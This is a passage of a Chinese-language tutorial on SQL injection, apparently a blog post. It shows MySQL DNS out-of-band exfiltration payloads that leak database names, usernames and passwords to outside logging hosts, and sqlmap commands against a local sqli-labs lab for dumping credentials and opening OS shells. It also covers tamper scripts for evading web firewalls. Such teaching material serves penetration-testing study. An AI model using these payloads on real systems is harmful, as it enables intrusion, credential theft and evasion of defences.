可以读取的磁盘，若不可用，则修改 my.ini 配置文件 当 secure_file_priv 为 空，表示不对mysqld 的导入|导出做限制，就可以读取磁盘的目录 当 secure_file_priv 为 C:\，就可以读取C盘的文件 当 secure_file_priv 为 null，表示限制 mysqld 不允许导入/导出 1234567mysql&gt; show variables like '%secure%';+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_auth | OFF || secure_file_priv | NULL |+------------------+-------+ 修改mysql.ini 文件，在[mysqld] 下加入: 1secure_file_priv = 修改完重启 MySQL 服务 1234567mysql&gt; show variables like '%secure%';+------------------+-------+| Variable_name | Value |+------------------+-------+| secure_auth | OFF || secure_file_priv | |+------------------+-------+ 详细演示查询当前数据库名 1234567and if((select load_file(concat('\\\\',(select database()),'.gvc791.ceye.io\\abc'))),1,0)# hex编码and if((select load_file(concat('\\\\',(select hex(database())),'.gvc791.ceye.io\\abc'))),1,0)# Hyugaand if((select load_file(concat('\\\\',(select hex(database())),'.c3ini5.hyuga.co\\abc'))),1,0) 这个地方Hex编码的目的就是减少干扰，因为很多事数据库字段的值可能是有特殊符号的，这些特殊符号拼接在域名里是无法做dns查询的，因为域名是有一定的规范，有些特殊符号是不能带入的。 查询第1个表名 1and if((select load_file(concat('\\\\',(select hex(table_name) from information_schema.tables where table_schema=database() limit 0,1),'.gvc791.ceye.io\\abc'))),1,0) 查询第1个字段名 1and if((select load_file(concat('\\\\',(select hex(column_name) from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),'.gvc791.ceye.io\\abc'))),1,0) 查询单个列的数据 1and if((select load_file(concat('\\\\',(select hex(username) from users limit 0,1),'.gvc791.ceye.io\\abc'))),1,0) 查询多个列的数据 1and if((select load_file(concat('\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.gvc791.ceye.io\\abc'))),1,0) SQLMap基础SQLMap 简介sqlmap 是一款自动化检测与利用 SQL 注入漏洞的免费开源工具。 完全支持 MySQL，Oracle，PostgresSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB 和 HSQLDB 数据库管理系统。 完全支持4种 SQL 注入技术：布尔型盲注，时间型盲注，报错型注入，UNION 查询注入 可以测试并利用 GET 和 POST 参数，HTTP 头中的 Cookie，User-Agent 和 Referer 这些地方出现的 SQL 注入漏洞。也可以指定一个用英文逗号隔开的参数列表进行测试。 HTTP(S) 代理支持通过使用验证代理服务器对目标应用发起请求，同时支持 HTTPS 请求 支持设置输出信息的详细级别：共有七个级别的详细程度。 支持从目标 URL 中解析 HTML 表单并伪造 HTTP(S) 请求以测试这些表单参数是否存在漏洞。 … 安装配置 官网：http://sqlmap.org/ 项目地址: https://github.com/sqlmapproject/sqlmap 基本操作检测是否存在 SQL 注入 1-u "http://10.211.55.6/sqli-labs/Less-1/?id=1" 查看基本信息 1234567891011121314151617181920# 查看当前数据库-u "http://10.211.55.6/sqli-labs/Less-1/?id=1" --current-db# 查看当前用户-u "http://10.211.55.6/sqli-labs/Less-1/?id=1" --current-user# 获取数据库 banner 信息 -u "http://10.211.55.6/sqli-labs/Less-1/?id=1" -b# 获取主机名-u "http://10.211.55.6/sqli-labs/Less-1/?id=1" --hostname# 检测当前用户是否是高权限用户-u "http://10.211.55.6/sqli-labs/Less-1/?id=1" --is-dba# 查看所有用户-u "http://10.211.55.6/sqli-labs/Less-1/?id=1" --users# 查看所有所有数据库-u "http://10.211.55.6/sqli-labs/Less-1/?id=1" --dbs 查看当前数据库下的表信息 开关：--count 如果用户想要在导出所需表数据之前知道表中的条目数，可以使用此开关。 1-u "http://10.211.55.6/sqli-labs/Less-1/?id=1" -D 'security' --tables 枚举表名下的列信息 1-u "http://10.211.55.6/sqli-labs/Less-1/?id=1" -D 'security' -T 'users' --columns 查询 users 表下所有 username和 password 列的字段信息 1-u "http://10.211.55.6/sqli-labs/Less-1/?id=1" -D 'security' -T 'users' -C 'username,password' --dump 详细用法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261用法：python sqlmap.py [选项]选项： -h, --help 显示基本帮助信息并退出 -hh 显示高级帮助信息并退出 --version 显示程序版本信息并退出 -v VERBOSE 输出信息详细程度级别：0-6（默认为 1） 目标： 至少提供一个以下选项以指定目标 -d DIRECT 直接连接数据库 -u URL, --url=URL 目标 URL（例如："http://www.site.com/vuln.php?id=1"） -l LOGFILE 从 Burp 或 WebScarab 代理的日志文件中解析目标地址 -x SITEMAPURL 从远程网站地图（.xml）文件中解析目标 -m BULKFILE 从文本文件中获取批量目标 -r REQUESTFILE 从文件中读取 HTTP 请求 -g GOOGLEDORK 使用 Google dork 结果作为目标 -c CONFIGFILE 从 INI 配置文件中加载选项 请求： 以下选项可以指定连接目标地址的方式 --method=METHOD 强制使用提供的 HTTP 方法（例如：PUT） --data=DATA 使用 POST 发送数据串 --param-del=PARA.. 设置参数值分隔符 --cookie=COOKIE 指定 HTTP Cookie --cookie-del=COO.. 设置 cookie 分隔符 --load-cookies=L.. 指定以 Netscape/wget 格式存放 cookies 的文件 --drop-set-cookie 忽略 HTTP 响应中的 Set-Cookie 参数 --user-agent=AGENT 指定 HTTP User-Agent --random-agent 使用随机的 HTTP User-Agent --host=HOST 指定 HTTP Host --referer=REFERER 指定 HTTP Referer -H HEADER, --hea.. 设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"） --headers=HEADERS 设置额外的 HTTP 头参数（例如："Accept-Language: fr\nETag: 123"） --auth-type=AUTH.. HTTP 认证方式（Basic，Digest，NTLM 或 PKI） --auth-cred=AUTH.. HTTP 认证凭证（username:password） --auth-file=AUTH.. HTTP 认证 PEM 证书/私钥文件 --ignore-code=IG.. 忽略 HTTP 错误码（例如：401） --ignore-proxy 忽略系统默认代理设置 --ignore-redirects 忽略重定向尝试 --ignore-timeouts 忽略连接超时 --proxy=PROXY 使用代理连接目标 URL --proxy-cred=PRO.. 使用代理进行认证（username:password） --proxy-file=PRO.. 从文件中加载代理列表 --tor 使用 Tor 匿名网络 --tor-port=TORPORT 设置 Tor 代理端口代替默认端口 --tor-type=TORTYPE 设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认）） --check-tor 检查是否正确使用了 Tor --delay=DELAY 设置每个 HTTP 请求的延迟秒数 --timeout=TIMEOUT 设置连接响应的有效秒数（默认为 30） --retries=RETRIES 连接超时时重试次数（默认为 3） --randomize=RPARAM 随机更改给定的参数值 --safe-url=SAFEURL 测试过程中可频繁访问且合法的 URL 地址（译者注： 有些网站在你连续多次访问错误地址时会关闭会话连接， 后面的“请求”小节有详细说明） --safe-post=SAFE.. 使用 POST 方法发送合法的数据 --safe-req=SAFER.. 从文件中加载合法的 HTTP 请求 --safe-freq=SAFE.. 每访问两次给定的合法 URL 才发送一次测试请求 --skip-urlencode 不对 payload 数据进行 URL 编码 --csrf-token=CSR.. 设置网站用来反 CSRF 攻击的 token --csrf-url=CSRFURL 指定可提取反 CSRF 攻击 token 的 URL --force-ssl 强制使用 SSL/HTTPS --hpp 使用 HTTP 参数污染攻击 --eval=EVALCODE 在发起请求前执行给定的 Python 代码（例如： "import hashlib;id2=hashlib.md5(id).hexdigest()"） 优化： 以下选项用于优化 sqlmap 性能 -o 开启所有优化开关 --predict-output 预测常用请求的输出 --keep-alive 使用持久的 HTTP(S) 连接 --null-connection 仅获取页面大小而非实际的 HTTP 响应 --threads=THREADS 设置 HTTP(S) 请求并发数最大值（默认为 1） 注入： 以下选项用于指定要测试的参数， 提供自定义注入 payloads 和篡改参数的脚本 -p TESTPARAMETER 指定需要测试的参数 --skip=SKIP 指定要跳过的参数 --skip-static 指定跳过非动态参数 --param-exclude=.. 用正则表达式排除参数（例如："ses"） --dbms=DBMS 指定 DBMS 类型（例如：MySQL） --dbms-cred=DBMS.. DBMS 认证凭据（username:password） --os=OS 指定 DBMS 服务器的操作系统类型 --invalid-bignum 将无效值设置为大数 --invalid-logical 对无效值使用逻辑运算 --invalid-string 对无效值使用随机字符串 --no-cast 关闭 payload 构造机制 --no-escape 关闭字符串转义机制 --prefix=PREFIX 注入 payload 的前缀字符串 --suffix=SUFFIX 注入 payload 的后缀字符串 --tamper=TAMPER 用给定脚本修改注入数据 检测： 以下选项用于自定义检测方式 --level=LEVEL 设置测试等级（1-5，默认为 1） --risk=RISK 设置测试风险等级（1-3，默认为 1） --string=STRING 用于确定查询结果为真时的字符串 --not-string=NOT.. 用于确定查询结果为假时的字符串 --regexp=REGEXP 用于确定查询结果为真时的正则表达式 --code=CODE 用于确定查询结果为真时的 HTTP 状态码 --text-only 只根据页面文本内容对比页面 --titles 只根据页面标题对比页面 技术： 以下选项用于调整特定 SQL 注入技术的测试方法 --technique=TECH 使用的 SQL 注入技术（默认为“BEUSTQ”，译者注： B: Boolean-based blind SQL injection（布尔型盲注） E: Error-based SQL injection（报错型注入） U: UNION query SQL injection（联合查询注入） S: Stacked queries SQL injection（堆查询注入） T: Time-based blind SQL injection（时间型盲注） Q: inline Query injection（内联查询注入） --time-sec=TIMESEC 延迟 DBMS 的响应秒数（默认为 5） --union-cols=UCOLS 设置联合查询注入测试的列数目范围 --union-char=UCHAR 用于暴力猜解列数的字符 --union-from=UFROM 设置联合查询注入 FROM 处用到的表 --dns-domain=DNS.. 设置用于 DNS 渗出攻击的域名（译者注： 推荐阅读《在SQL注入中使用DNS获取数据》 http://cb.drops.wiki/drops/tips-5283.html， 在后面的“技术”小节中也有相应解释） --second-order=S.. 设置二阶响应的结果显示页面的 URL（译者注： 该选项用于二阶 SQL 注入） 指纹识别： -f, --fingerprint 执行广泛的 DBMS 版本指纹识别 枚举： 以下选项用于获取后端数据库管理系统的信息，结构和数据表中的数据。 此外，还���以运行你输入的 SQL 语句 -a, --all 获取所有信息、数据 -b, --banner 获取 DBMS banner --current-user 获取 DBMS 当前用户 --current-db 获取 DBMS 当前数据库 --hostname 获取 DBMS 服务器的主机名 --is-dba 探测 DBMS 当前用户是否为 DBA（数据库管理员） --users 枚举出 DBMS 所有用户 --passwords 枚举出 DBMS 所有用户的密码哈希 --privileges 枚举出 DBMS 所有用户特权级 --roles 枚举出 DBMS 所有用户角色 --dbs 枚举出 DBMS 所有数据库 --tables 枚举出 DBMS 数据库中的所有表 --columns 枚举出 DBMS 表中的所有列 --schema 枚举出 DBMS 所有模式 --count 获取数据表数目 --dump 导出 DBMS 数据库表项 --dump-all 导出所有 DBMS 数据库表项 --search 搜索列，表和/或数据库名 --comments 获取 DBMS 注释 -D DB 指定要枚举的 DBMS 数据库 -T TBL 指定要枚举的 DBMS 数据表 -C COL 指定要枚举的 DBMS 数据列 -X EXCLUDECOL 指定要排除的 DBMS 数据列 -U USER 指定枚举的 DBMS 用户 --exclude-sysdbs 枚举所有数据表时，指定排除特定系统数据库 --pivot-column=P.. 指定主列 --where=DUMPWHERE 在转储表时使用 WHERE 条件语句 --start=LIMITSTART 指定要导出的数据表条目开始行数 --stop=LIMITSTOP 指定要导出的数据表条目结束行数 --first=FIRSTCHAR 指定获取返回查询结果的开始字符位 --last=LASTCHAR 指定获取返回查询结果的结束字符位 --sql-query=QUERY 指定要执行的 SQL 语句 --sql-shell 调出交互式 SQL shell --sql-file=SQLFILE 执行文件中的 SQL 语句 暴��破解： 以下选项用于暴力破解测试 --common-tables 检测常见的表名是否存在 --common-columns 检测常用的列名是否存在 用户自定义函数注入： 以下选项用于创建用户自定义函数 --udf-inject 注入用户自定义函数 --shared-lib=SHLIB 共享库的本地路径 访问文件系统： 以下选项用于访问后端数据库管理系统的底层文件系统 --file-read=RFILE 读取后端 DBMS 文件系统中的文件 --file-write=WFILE 写入后端 DBMS 文件系统中的文件 --file-dest=DFILE 使用文件绝对路径写入到后端 DBMS 访问操作系统： 以下选项用于访问后端数据库管理系统的底层操作系统 --os-cmd=OSCMD 执行操作系统命令 --os-shell 调出交互式操作系统 shell --os-pwn 调出 OOB shell，Meterpreter 或 VNC --os-smbrelay 一键调出 OOB shell，Meterpreter 或 VNC --os-bof 利用存储过程的缓冲区溢出 --priv-esc 数据库进程用户提权 --msf-path=MSFPATH Metasploit 框架的本地安装路径 --tmp-path=TMPPATH 远程临时文件目录的绝对路径 访问 Windows 注册表： 以下选项用于访问后端数据库管理系统的 Windows 注册表 --reg-read 读取一个 Windows 注册表键值 --reg-add 写入一个 Windows 注册表键值数据 --reg-del 删除一个 Windows 注册表键值 --reg-key=REGKEY 指定 Windows 注册表键 --reg-value=REGVAL 指定 Windows 注册表键值 --reg-data=REGDATA 指定 Windows 注册表键值数据 --reg-type=REGTYPE 指定 Windows 注册表键值类型 通用选项： 以下选项用于设置通用的参数 -s SESSIONFILE 从文件（.sqlite）中读入会话信息 -t TRAFFICFILE 保存所有 HTTP 流量记录到指定文本文件 --batch 从不询问用户输入，使用默认配置 --binary-fields=.. 具有二进制值的结果字段（例如："digest"） --check-internet 在访问目标之前检查是否正常连接互联网 --crawl=CRAWLDEPTH 从目标 URL 开始爬取网站 --crawl-exclude=.. 用正则表达式筛选爬取的页面（例如："logout"） --csv-del=CSVDEL 指定输出到 CVS 文件时使用的分隔符（默认为“,”） --charset=CHARSET 指定 SQL 盲注字符集（例如："0123456789abcdef"） --dump-format=DU.. 导出数据的格式（CSV（默认），HTML 或 SQLITE） --encoding=ENCOD.. 指定获取数据时使用的字符编码（例如：GBK） --eta 显示每个结果输出的预计到达时间 --flush-session 清空当前目标的会话文件 --forms 解析并测试目标 URL 的表单 --fresh-queries 忽略存储在会话文件中的查询结果 --har=HARFILE 将所有 HTTP 流量记录到一个 HAR 文件中 --hex 获取数据时调用 DBMS 的 hex 函数 --output-dir=OUT.. 自定义输出目录路径 --parse-errors 从响应中解析并显示 DBMS 错误信息 --save=SAVECONFIG 将选项设置保存到一个 INI 配置文件 --scope=SCOPE 用正则表达式从提供的代理日志中过滤目标 --test-filter=TE.. 根据 payloads 和/或标题（例如：ROW）选择测试 --test-skip=TEST.. 根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试 --update 更新 sqlmap 其他选项： -z MNEMONICS 使用短助记符（例如：“flu,bat,ban,tec=EU”） --alert=ALERT 在找到 SQL 注入时运行 OS 命令 --answers=ANSWERS 设置问题答案（例如：“quit=N,follow=N”） --beep 出现问题提醒或在发现 SQL 注入时发出提示音 --cleanup 指定移除 DBMS 中的特定的 UDF 或者数据表 --dependencies 检查 sqlmap 缺少什么（非核心）依赖 --disable-coloring 关闭彩色控制台输出 --gpage=GOOGLEPAGE 指定页码使用 Google dork 结果 --identify-waf 针对 WAF/IPS/IDS 保护进行彻底的测试 --mobile 使用 HTTP User-Agent 模仿智能手机 --offline 在离线模式下工作（仅使用会话数据） --purge-output 安全地删除输出目录的所有内容 --skip-waf 跳过启发式检测 WAF/IPS/IDS 保护 --smart 只有在使用启发式检测时才进行彻底的测试 --sqlmap-shell 调出交互式 sqlmap shell --tmp-dir=TMPDIR 指定用于存储临时文件的本地目录 --web-root=WEBROOT 指定 Web 服务器根目录（例如："/var/www"） --wizard 适合初级用户的向导界面 --random-agent 使用随机的 HTTP User-Agent 可以欺骗网站日志记录--dbms =MySQL 指定数据库 节省时间--technique= 指定报错注入 节省时间 SQLMap中级输出详细等级选项：-v 该选项用于设置输出信息的详细等级，共有七个级别。默认级别为 1，输出包括普通信息，警告，错误，关键信息和 Python 出错回遡信息（如果有的话）。 0：只输出 Python 出错回溯信息，错误和关键信息。 1：增加输出普通信息和警告信息。 2：增加输出调试信息。 3：增加输出已注入的 payloads。 4：增加输出 HTTP 请求。 5：增加输出 HTTP 响应头 6：增加输出 HTTP 响应内容。 使用等级 2 能更好地了解 sqlmap 内部实现了什么，特别是在检测阶段和使用接管功能时。如果你想知道 sqlmap 发送了什么 SQL payloads，等级 3 是最佳选择。需要更深入地检测潜在 Bugs 或应对未知情况时，推荐使用 4 或以上等级。 目标从给定的文本文件读取多个目标进行扫描选项：-m 通过文本文件提供一个目标 URLs 列表，sqlmap 会逐个进行扫描检测。 样本文件所提供的 URLs 列表示例： 123www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1* 从文件中载入 HTTP 请求选项：-r sqlmap 可以从一个文本中读取原始的 HTTP 请求。通过这种方式，你能够免于设置部分选项（例如：设置 cookies，POST 数据等参数）。 HTTP 请求文件数据样本如下： 12345POST /vuln.php HTTP/1.1Host: www.target.comUser-Agent: Mozilla/4.0id=1 如果相关的请求是 HTTPS，你可以结合 --force-ssl 开关强制使用 SSL 进行 443/tcp 连接。或者，你可以在 Host 头部信息后面直接加上 :443。 请求HTTP User-Agent 请求头选项和开关：--user-agent 和 --random-agent 默认情况下，sqlmap 使用以下 User-Agent 请求头值执行 HTTP 请求： 1sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org) 可以通过提供自定义 User-Agent 作为选项的参数，即选项 --user-agent 来伪造它。 此外，如果通过提供开关 --random-agent，sqlmap 将从 ./txt/user-agents.txt 文本文件中随机选择一个 User-Agent，并将其用于该会话中的所有 HTTP 请求。 一些站点会对 HTTP User-Agent 请求头值进行服务端检查，如果没有提供有效的 User-Agent，它的值不是常规值或被 Web 应用程序防火墙或类似防御系统列入黑名单，则服务端会拒绝 HTTP 响应。在这种情况下，sqlmap 将显示如下信息： 注意，如果 --level 设置为 3 或以上，sqlmap 会对 HTTP User-Agent 请求头进行 SQL 注入测试。详情请看下文。 开启apache的日志记录功能 注意，如果 --level 设置为 3 或以上，sqlmap 会对 HTTP User-Agent 请求头进行 SQL 注入测试。详情请看下文。 打开配置文件-httpd-conf”，打开httpd.conf配置文件 1##CustomLog &quot;logs/access.log&quot; common 去掉前边的 # ，并重启apache。 检测下面的相关选项可用于自定义检测环节。 级别选项：--level 使用这个选项需要给出一个参数用于指定即将进行检测的级别。总共有5个级别。 默认的级别是 1，该级别只会进行简单的检测（请求）。 与之不同的是，级别 5 会更详细地对更大范围 payloads 和 boundaries（作为 SQL payload 的前缀和后缀）进行检测。 sqlmap 使用的 payloads 直接从文本文件 xml/payloads.xml 中载入。 根据该文件顶部的相关指导说明进行设置，该文件支持用户自定义编辑添加。 这个选项设置不止会影响 sqlmap 使用的 payload，还会影响到相关的测试注入点：总是测试 GET 和 POST 的相关参数，级别大于等于 2 则会测试 HTTP Cookie 头部，级别大于等于 3 则会测试 HTTP UserAgent/Referer 头部值。 总而言之， 如果 SQL 注入检测的难度越高，则需要设定越高的 --level 值。 风险选项：--risk 这个选项需要给出一个参数用于指定即将进行检测的风险程度。总共有3个风险级别。 默认的级别是 1，对大多数 SQL 注入点而言是没有任何风险的。风险级别 2 则会在默认的检测上添加大量时间型盲注语句测试，级别 3 则会在原基础上添加OR类型的布尔型盲注测试。 在某些场景下，例如对 UPDATE 语句进行 SQL 注入，注入一个 OR 类型的 payload 会导致目标数据表的所有记录进行更新，显然这个不是攻击者想要的结果。针 对这个场景及其他相关场景，sqlmap 引入了 --risk 这个选项。通过这个选项：用户可以指定检测特定的 payload，同时用户可任意选择使用可能比较危险的操作。正如上面的选项提及到的，sqlmap 使用的 payloads 是直接在文本文件 xml/payloads.xml 载入的，该文件支持用户自定义编辑添加。 注入URI 注入点有一些特殊情况是注入点处于 URI 本身内。除非手动指定，sqlmap 不会对 URI 路径执行任何自动测试。你需要在命令行中标明这些注入点，通过在每个需要 sqlmap 测试和利用 SQL 注入的 URI 点后面附加一个星号（*）（注意：也支持 Havij 风格 %INJECT HERE%）。 例如，当使用了 Apache Web 服务器的 mod_rewrite 模块或其他类似的技术时，这特别有用。 一个合法命令行例子如下： 1python sqlmap.py -u &quot;http://targeturl/param1/value1*/param2/value2/&quot; 指定 DBMS 类型选项：--dbms 默认情况下 sqlmap 会自动检测 Web 应用程序的后端 DBMS。sqlmap 完全支持以下数据库管理系统： MySQL Oracle PostgreSQL Microsoft SQL Server Microsoft Access IBM DB2 SQLite Firebird Sybase SAP MaxDB HSQLDB Informix 注意，此选项不是强制性的，强烈建议仅当你绝对确定后端 DBMS 时使用它。如果你不知道，就让 sqlmap 自动为你识别指纹信息。 接管操作系统运行任意操作系统命令选项和开关：--os-cmd 和 --os-shell 当后端 DBMS 为 MySQL，PostgreSQL 或 Microsoft SQL Server，并且当前会话用户拥有对数据库特定功能和相关架构特性的利用权限时，sqlmap 能够在数据库所在服务器的操作系统上运行任意的命令。 SQLMap高级目标直连数据库选项：-d 针对单一数据库实例运行 sqlmap 工具。这个选项可设置为下面格式的连接字符串： DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME（MySQL，Oracle，Microsoft SQL Server，PostgreSQL 等。) DBMS://DATABASE_FILEPATH（SQLite，Microsoft Access，Firebird 等。） 例如： 1python sqlmap.py -d "mysql://admin:admin@192.168.21.17:3306/testdb" --dbs --users 需要 Python 安装对应的依赖： 12pip3 install SQLAlchemypip3 install mysqlclient 技术以下选项可用于调整对特定 SQL 注入技术的测试。 测试会用到的 SQL 注入技术选项：--technique 此选项用于指定需要测试的 SQL 注入类型。默认情况下 sqlmap 会测试它支持的所有类型/技术。 在某些情况下，你可能只想测试一种或几种特定类型的 SQL 注入，这便是该选项存在的作用。 此选项要一个参数值。该参数是由 B，E，U，S，T 和 Q 这样的字符任意组合成的字符串，每个字母代表不同的技术： B：布尔型盲注 E：报错型注入 U：联合查询注入 S：堆查询注入 T：时间型盲注 Q：内联查询注入 例如，如果仅测试利用报错型注入和堆查询注入，你可以提供 ES。默认值为 BEUSTQ。 注意，当你需要访问文件系统，接管操作系统或访问 Windows 注册表配置单元时，提供的字符串必须包含代表堆查询技术的字母 S。 设置时间型盲注中 DBMS 延迟响应秒数选项：--time-sec 为 --time-sec 提供一个整数，可以设置时间型盲注响应的延迟时间。默认情况下，它的值为 5 秒。 注入自定义注入 payload选项：--prefix 和 --suffix 在某些情况下，仅当用户提供附加到注入 payload 的特定后缀时，才能利用易受攻击的参数。另外，当用户已经知道查询语法并希望通过直接提供注入 payload 前缀和后缀来检测利用 SQL 注入时，这些选项对这种场景会很方便。 漏洞源代码示例： 1$query = &quot;SELECT * FROM users WHERE id=(&apos;&quot; . $_GET[&apos;id&apos;] . &quot;&apos;) LIMIT 0, 1&quot;; 要检测并利用此 SQL 注入，您可以让 sqlmap 在检测阶段检测边界（与 SQL payload 前缀和后缀组合），或者自己提供。 例如： 123$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php\?id=1&quot; -p id --prefix &quot;&apos;)&quot; --suffix &quot;AND (&apos;abc&apos;=&apos;abc&quot;[...] 这将使所有 sqlmap 请求最终构成以下查询： 1$query = &quot;SELECT * FROM users WHERE id=(&apos;1&apos;) &lt;PAYLOAD&gt; AND (&apos;abc&apos;=&apos;abc&apos;) LIMIT 0, 1&quot;; 以使查询语法正确。 在这个简单的例子中，sqlmap 可以检测 SQL 注入并利用它，而不需要提供自定义的边界，但有时在真实情况中的应用程序，当注入点存在于嵌套的 JOIN 查询中时，需要提供它。 修改注入数据选项：--tamper sqlmap 本身不会混淆发送的 payload，除了将单引号之间的字符串用诸如 CHAR() 进行替换。 如果后端 DBMS 与用户输入内容存在较弱验证机制的情况下，此选项会非常有用。这种验证机制通常是由应用程序源代码调用自行开发的输入验证例程，如昂贵的企业级 IPS 设备或 Web 应用程序防火墙（WAF）。一言蔽之，它们通常以不同的方式实现并且需要花费大量资金。 要利用此选项，需要为 sqlmap 提供逗号分隔的修改脚本列表，这将处理 payload 并返回转换结果。你可以定义自己的修改脚本，编辑使用 sqlmap tamper/ 文件夹中的脚本，并使用逗号分隔连接它们作为 --tamper 选项的值（例如：--tamper=&quot;between,randomcase&quot;）。 合法的修改脚本格式如下： 123456789101112131415161718# Needed importsfrom lib.core.enums import PRIORITY# Define which is the order of application of tamper scripts against# the payload__priority__ = PRIORITY.NORMALdef tamper(payload): &apos;&apos;&apos; Description of your tamper script &apos;&apos;&apos; retVal = payload # your code to tamper the original payload # return the tampered payload return retVal 你可以在 tamper/ 目录中查看有效和可用的修改脚本。 针对 MySQL 目标，假定字符 &gt;、空格和大写的 SELECT 字符串被禁止： 12345678910111213141516171819202122$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --\tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3[hh:mm:03] [DEBUG] cleaning up configuration parameters[hh:mm:03] [INFO] loading tamper script &apos;between&apos;[hh:mm:03] [INFO] loading tamper script &apos;randomcase&apos;[hh:mm:03] [INFO] loading tamper script &apos;space2comment&apos;[...][hh:mm:04] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041[...][hh:mm:04] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&apos;[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/group/**/bY/**/x)a)[hh:mm:04] [INFO] GET parameter &apos;id&apos; is &apos;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause&apos; injectable[...] sqlmap 1.2.7.20 版本，共有 57 个tamper脚本，与 1.0 版本相比新增了 19 个脚本。 序号 脚本名称 注释 1 0x2char 将每个编码后的字符转换为等价表达 2 apostrophemask 单引号替换为Utf8字符 3 apostrophenullencode 替换双引号为%00%27 4 appendnullbyte 有效代码后添加%00 5 base64encode 使用base64编码 6 between 比较符替换为between 7 bluecoat 空格替换为随机空白字符，等号替换为like 8 chardoubleencode 双url编码 9 charencode 将url编码 10 charunicodeencode 使用unicode编码 11 charunicodeescape 以指定的payload反向编码未编码的字符 12 commalesslimit 改变limit语句的写法 13 commalessmid 改变mid语句的写法 14 commentbeforeparentheses 在括号前加内联注释 15 concat2concatws 替换CONCAT为CONCAT_WS 16 equaltolike 等号替换为like 17 escapequotes 双引号替换为\ 18 greatest 大于号替换为greatest 19 halfversionedmorekeywords 在每个关键字前加注释 20 htmlencode html编码所有非字母和数字的字符 21 ifnull2casewhenisnull 改变ifnull语句的写法 22 ifnull2ifisnull 替换ifnull为if(isnull(A)) 23 informationschemacomment 标示符后添加注释 24 least 替换大于号为least 25 lowercase 全部替换为小写值 26 modsecurityversioned 空格替换为查询版本的注释 27 modsecurityzeroversioned 添加完整的查询版本的注释 28 multiplespaces 添加多个空格 29 nonrecursivereplacement 替换预定义的关键字 30 overlongutf8 将所有字符转义为utf8 31 overlongutf8more 以指定的payload转换所有字符 32 percentage 每个字符前添加% 33 plus2concat 将加号替换为concat函数 34 plus2fnconcat 将加号替换为ODBC函数{fn CONCAT()} 35 randomcase 字符大小写随机替换 36 randomcomments /**/分割关键字 37 securesphere 添加某字符串 38 sp_password 追加sp_password字符串 39 space2comment 空格替换为/**/ 40 space2dash 空格替换为–加随机字符 41 space2hash 空格替换为#加随机字符 42 space2morecomment 空格替换为/_/ 43 space2morehash 空格替换为#加随机字符及换行符 44 space2mssqlblank 空格替换为其他空符号 45 space2mssqlhash 空格替换为%23%0A 46 space2mysqlblank 空格替换为其他空白符号 47 space2mysqldash 空格替换为–%0A 48 space2plus 空格替换为加号 49 space2randomblank 空格替换为备选字符集中的随机字符 50 symboliclogical AND和OR替换为&amp;&amp; 51 unionalltounion union all select替换为union select 52 unmagicquotes 宽字符绕过GPC 53 uppercase 全部替换为大写值 54 varnish 添加HTTP头 55 versionedkeywords 用注释封装每个非函数的关键字 56 versionedmorekeywords 使用注释绕过 57 xforwardedfor 添加伪造的HTTP头 杂项清空会话文件选项：--flush-session 经过上面的相关描述，相信你已经熟悉了会话文件的相关概念，值得注意的是，你可以通过选项 --flush-session 来清空会话文件内容。这样你可以避免 sqlmap 默认的缓存机制。也可以手动移除相关的会话文件。 使用 DBMS hex 函数获取数据开关：--hex 很多情况下，获取非 ASCII 数据都会有特殊要求。其中一个解决方案就是使用 DBMS hex 函数。开启这个开关，数据在被获取之前，会被编码成十六进制格式，并在随后被解码成原先的格式。 使用 HTTP 参数污染开关：--hpp HTTP 参数污染（HPP）是一种绕过 WAF/IPS/IDS 保护机制（这里有相关介绍）的方法，针对 ASP/IIS 和 ASP.NET/IIS 平台尤其有效。如果你怀疑目标使用了这种保护机制，可以尝试使用此开关以绕过它。 针对 WAF/IPS/IDS 保护进行通过测试开关：--identify-waf sqlmap 可以尝试识别后端 WAF/IPS/IDS 保护（如果有），以便用户可以执行适当的步骤（例如：通过选项 --tamper 使用篡改脚本）。目前，大约支持 30 种不同的产品（例如：Airlock，Barracuda WAF 等），可以在 waf 目录下找到它们对应的 WAF 脚本。 伪装智能手机开关：--mobile 有时 Web 服务器向手机提供的是不同于电脑的接口。在这种情况下，你可以强制使用预定义好的智能手机 HTTP User-Agent 头部值。使用此开关，sqlmap 将询问你选择一种流行的智能手机，它将在当前运行中进行伪装。 运行示例： 123456789101112$ python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; --mobile[...]which smartphone do you want sqlmap to imitate through HTTP User-Agent header?[1] Apple iPhone 4s 